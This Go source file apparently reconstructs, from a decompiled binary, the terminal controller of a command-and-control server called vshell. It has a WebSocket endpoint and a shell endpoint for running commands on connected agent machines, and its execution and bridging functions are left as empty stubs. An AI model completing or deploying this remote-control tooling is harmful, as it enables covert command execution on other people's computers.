// Package controllers — 终端控制器，1:1 对齐原版二进制。
//
// 真实方法（funcnametab + 反编译地址）与前端路由：
//
//	Ws     0x18f06c0   GET /api/terminal/ws?id=<id>&token=<token>  交互终端 WebSocket
//	Shell  0x18f0c80   POST /terminal/shell                         执行单条命令
//
// 前端内嵌 JS：`ws://host/api/terminal/ws?id="+t+"&token="+j`（xterm.js + attach addon）。
package controllers

import (
	"vshell/c2engine"
	"github.com/beego/beego/v2/server/web/context"
)

// TerminalController 提供 Agent 交互终端。
type TerminalController struct {
	ApiBaseController
}

// Ws 交互终端 WebSocket（GET /api/terminal/ws?id=<clientID>&token=<token>）。
// 反编译（FUN_018f06c0）：id = JsonGetInt("id")（FUN_018d9200）→ GetClient(id)
// （FUN_01198ac0）失败或 client.Status（+0x50）为假 → "client is close"
// （FUN_018f8080，15 字节链已解）；后续校验失败 → "close"（DAT_01bd8915）；
// 然后 WebSocket 升级（FUN_01636a40）并注册读写处理器（LAB_018f0be0/018f0b60）。
func (c *TerminalController) Ws() {
	id := c.JsonGetInt("id")
	client := c2engine.GetEngine().GetClient(int64(id))
	if client == nil || !client.Status {
		c.JsonErr("client is close")
		return
	}
	// TODO(engine): 桥接客户端 shell 会话与 WebSocket（升级 + 读写处理器）
	engineBridgeTerminal(c.Ctx, int64(id))
	c.Data["json"] = map[string]interface{}{"status": "ws"}
	c.ServeJSON()
}

// Shell 执行单条命令（POST /terminal/shell）。
// 反编译（0x18f0c80）：id = JsonGetInt("id")（FUN_018d7f40），command =
// JsonGetStr("command")（7 字符，FUN_018d80a0）；GetClient(id) 缺失或 Status(+0x50)
// 为假 → "client is close"（FUN_018f76c0）；客户端架构检查（+0x98/+0xa0，
// "windows_amd64" FUN_018f7d20 / "windows_386" FUN_018f7fa0）；输出错误标记
// "->|ERROR://"（FUN_018f7960）前缀 "->|"。
func (c *TerminalController) Shell() {
	id := int64(c.JsonGetInt("id"))
	gbk := c.JsonGetBool("gbk")
	cmd := c.JsonGetStr("command")
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	client := c2engine.GetEngine().GetClient(id)
	if client == nil || !client.Status {
		c.JsonErr("client is close")
		return
	}
	out := engineExecShell(id, cmd, gbk)
	c.JsonOkResult(map[string]interface{}{"output": out})
}

// ---- 引擎阶段对齐 ----

func engineBridgeTerminal(ctrl *context.Context, id int64) {
	// TODO(engine): 对齐终端桥接（客户端 shell 会话 <-> WebSocket）
}

func engineExecShell(id int64, cmd string, gbk bool) string {
	// TODO(engine): 对齐命令执行与 GBK 转码（TerminalController.Shell 反编译）
	return ""
}
